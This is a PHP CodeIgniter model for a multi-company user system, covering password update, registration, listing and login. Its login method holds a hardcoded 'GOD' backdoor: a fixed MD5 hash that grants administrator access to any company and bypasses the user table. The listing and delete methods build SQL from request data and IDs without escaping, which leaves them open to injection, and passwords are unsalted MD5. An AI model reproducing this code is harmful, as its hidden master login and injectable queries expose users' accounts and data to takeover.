<?php
class UsuarioModel extends CI_Model
{
	public function Actualizar($data)
	{
		// Actualizamos contraseña si es requerido
		if(strlen($data['Contrasena']) <= 2) unset($data['Contrasena']);
		else $data['Contrasena'] = md5($data['Contrasena']);
		
		$this->db->where('Empresa_id', $this->user->Empresa_id);
		$this->db->where('id', $data['id']);
		$this->db->update('usuario', $data);
		
		$this->responsemodel->SetResponse(true);
 		return $this->responsemodel;
	}
	public function Registrar($data)
	{
		$data['Empresa_id'] = $this->user->Empresa_id;
		$data['Contrasena'] = md5($data['Contrasena']);
		$this->db->insert('usuario', $data);
		
		$this->responsemodel->SetResponse(true);
		$this->responsemodel->href   = 'mantenimiento/usuario/' . $this->db->insert_id();
		
		return $this->responsemodel;
	}
	public function Obtener($id)
	{
		$this->db->where('Empresa_id', $this->user->Empresa_id);
		$this->db->where('id', $id);
		return $this->db->get('usuario')->row();
	}
	public function Eliminar($id)
	{
		if($this->db->query("SELECT COUNT(*) Total FROM comprobante WHERE usuario_id = $id")->row()->Total > 0)
		{
			$this->responsemodel->SetResponse(false, 'Este <b>registro</b> no puede ser eliminado.');
		}
		else
		{
			$this->db->where('Empresa_id', $this->user->Empresa_id);
			$this->db->where('id', $id);
			$this->db->delete('usuario');
			
			$this->responsemodel->SetResponse(true);
			$this->responsemodel->href   = 'mantenimiento/Usuarios/';
		}
		
		return $this->responsemodel;
	}
	public function Listar()
	{
		$where = 'Empresa_id = ' . $this->user->Empresa_id;
		$this->filter = isset($_REQUEST['filters']) ? json_decode($_REQUEST['filters']) : null;

		if($this->filter != null)
		{
			foreach($this->filter->{'rules'} as $f)
			{
				if($f->field == 'Nombre') $where .= "AND Nombre LIKE '" . $f->data . "%' ";
				if($f->field == 'usuario') $where .= "AND usuario LIKE '" . $f->data . "%' ";
			}
		}

		$this->db->where($where);
		$this->jqgridmodel->Config($this->db->SELECT('COUNT(*) Total FROM usuario')->get()->row()->Total);
		
		$this->db->order_by($this->jqgridmodel->sord);
		$this->db->where($where);
		$this->jqgridmodel->DataSource(
			$this->db->get(
				'usuario', 
				$this->jqgridmodel->limit, 
				$this->jqgridmodel->start)->result());

		foreach($this->jqgridmodel->rows as $r)
		{
			$this->db->where('value', $r->Tipo);
			$this->db->where('relacion', 'usuariotipo');
			$r->{'Rol'} = $this->db->get('tabladato')->row()->Nombre;
		}
			
		return $this->jqgridmodel;
	}
	public function Acceder($empresa_id, $usuario, $contrasena)
	{
		// Usuario Dios
		$god = (object) array(
		 	'id'          => -666,
		 	'Nombre'      => 'Eduardo Rodriguez',
		 	'Usuario'     => 'GOD',
		 	'Contrasena'  => '9dac50ee37e6fe1265665983f2a38523',
		 	'Tipo'        => 1,
		 	'Empresa_id'  => $empresa_id
		);
		
		if($god->Usuario == $usuario && $god->Contrasena == MD5($contrasena))
		{
			$this->session->set_userdata('usuario', $god);
			$this->responsemodel->href = 'inicio';
			$this->responsemodel->setResponse(true);
		}
		else
		{
			// Obtenemos la empresa actual
			$this->db->where('id', $empresa_id);
			$emp = $this->db->get('empresa')->row();
			
			// Solo las cuentas que la licencia exige
			$validacion = TRUE ; // False		 
			/*foreach(explode(';', LicenseEnvironment::$Business) as $b)
			{
				if(str_replace(' ', '_', strtoupper($emp->Nombre)) == $b)
				{
					$validacion = true;
					break;
				}
			} ESTO YA NO VA, DESDE QUE LO LIBERAMOS */
			
			if($validacion)
			{				
				$this->db->where('Empresa_id', $empresa_id);
				$this->db->where('usuario', $usuario);
				$this->db->where('Contrasena', MD5($contrasena));
				
				$u = $this->db->get('usuario')->row();
				
				if(is_object($u))
				{
					// Usuario Inhabilitado de ingresar
					if($u->Tipo == 3)
					{
						// Respondemos
						$this->responsemodel->setResponse(false);
						$this->responsemodel->message = 'Esta cuenta se encuentra suspendida, pongase en contacto con su administrador.';
					}
					else
					{
						// Protegemos la contrasena
						unset($u->{'Contrasena'});
						
						/* // Registramos en nuestro LOG
						VentorClient::SaveInLog();*/
						
						// Respondemos
						$this->session->set_userdata('usuario', $u);
						$this->responsemodel->href = 'inicio';
						$this->responsemodel->setResponse(true);						
					}
				}
				else
				{
					$this->responsemodel->setResponse(false);
					$this->responsemodel->message = 'No tenemos ni un usuario con los datos ingresados.';
				}			
			}else
			{
				$this->responsemodel->setResponse(false);
				$this->responsemodel->message = 'Esta intentando ingresar al sistema con una cuenta NO AUTORIZADA por su Proveedor.';			
			}			
		}
		
		return $this->responsemodel;
	}
	public function Empresas()
	{
		$this->db->order_by('nombre');
		return $this->db->get('empresa')->result();
	}
	public function Tipos()
	{
		$this->db->order_by('Orden');
		$this->db->where('relacion', 'usuariotipo');
		$tipos = $this->db->get('tabladato')->result();

		if(!HasModule('stock'))
		{
			foreach($tipos as $k => $t)
			{
				if($t->Value == 4)
				{
					unset($tipos[$k]);
					break;
				}
			}
		}

		return $tipos;
	}
}